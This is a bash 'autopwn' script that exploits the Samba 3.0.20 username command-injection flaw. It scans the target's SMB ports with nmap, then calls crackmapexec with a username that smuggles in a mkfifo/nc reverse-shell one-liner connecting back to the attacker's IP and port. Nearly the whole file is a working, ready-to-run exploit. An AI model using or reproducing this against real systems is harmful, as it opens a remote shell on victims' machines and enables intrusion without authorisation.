#!/bin/bash

BLACK='\033[0;30m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
GRAY='\033[0;90m'
END='\033[0m'

if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}\n\t[!]This script must be run as root${END}" >&2
    exit 1
fi

function ctrl_c(){
  echo -e "\n\n[!]Saliendo..."
  tput cnorm; exit 1
}

trap ctrl_c INT 

function banner(){
    echo -e "${CYAN} ______               _        _______       _ ${END}"
    echo -e "${CYAN} \______ \_______  ___|__|_  __\____  \   __| _/ ${END}"
    echo -e "${CYAN} |    |  \_  _ \/  _ \|  \  \/  /  _(_  <  / __ |  ${END}"
    echo -e "${CYAN} |    |   \   |    <_> )  |>    <  /       \/ /_/ |  ${END}"
    echo -e "${CYAN} /_______  /__|\____/|__/__/\___\/_/________/\____|  ${END}"
    echo -e "${CYAN}         \/                      \/       \/     \/  ${END}"
    echo -e "\t\t${PURPLE}Created by ~${END}${PURPLE}Droix3d  ${END}\n"
    echo -e "\t\t${WHITE}~${END}${YELLOW}Autopwn_ExploitSamba3.0.20${END}${WHITE}~${END}\n"
}

banner

if [ "$#" -ne 2 ]; then
    echo -e "${RED}Use: $0 <IP_VICTIMA> <IP_LOCAL:PUERTO>${END}"
    exit 1
fi

ip_victima=$1
ip_local_port=$2

IFS=':' read -r ip_local puerto <<< "$ip_local_port"

echo -e "${GREEN}\n[!]Scanning target machine...$ip_victima${END}"
sleep 3
echo -e "${RED}\n[!]Set a listener with netcat to $ip_local with port: $puerto${END}"
sleep 3

for i in {1..30};do
    echo -n "."
    sleep 0.1
done
echo
clear

banner


sudo nmap -sCV -sS --min-rate 5000 -p139,445 "$ip_victima" | awk '/139\/tcp|445\/tcp/ {print $1, $3, $4, $5, $6, $7}'

sleep 3

echo -e "${PURPLE}\n[+]Starting Reverse shell,please have netcat ready[+]\n${END}"

crackmapexec smb --shares "$ip_victima" -u './=`nohup rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc '$ip_local' '$puerto' >/tmp/f`' -p ''
